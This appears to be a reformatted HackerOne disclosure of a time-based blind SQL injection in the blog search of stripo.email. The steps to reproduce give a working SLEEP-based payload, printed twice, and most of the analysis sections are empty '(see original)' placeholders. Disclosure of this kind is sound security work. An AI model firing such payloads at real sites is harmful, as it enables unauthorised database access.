# stripo blog search  SQL Injection

## Metadata
- **Source:** HackerOne
- **Report:** 761382 | https://hackerone.com/reports/761382
- **Submitted:** 2019-12-19
- **Reporter:** bluebridsec
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
## Summary:

Sql injection of search parameters at blog search request

## Steps To Reproduce:

  1. request https://stripo.email/blog/search/
  2. input search `1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK`
  3. See a very large response delay

## Supporting Material/References:
See attached screenshot

## Impact

Causes an attacker to obtain database information

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:

Sql injection of search parameters at blog search request

## Steps To Reproduce:

  1. request https://stripo.email/blog/search/
  2. input search `1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK`
  3. See a very large response delay

## Supporting Material/References:
See attached screenshot

## Impact

Causes an attacker to obtain database information

</details>

---
*Analysed by Claude on 2026-05-24*
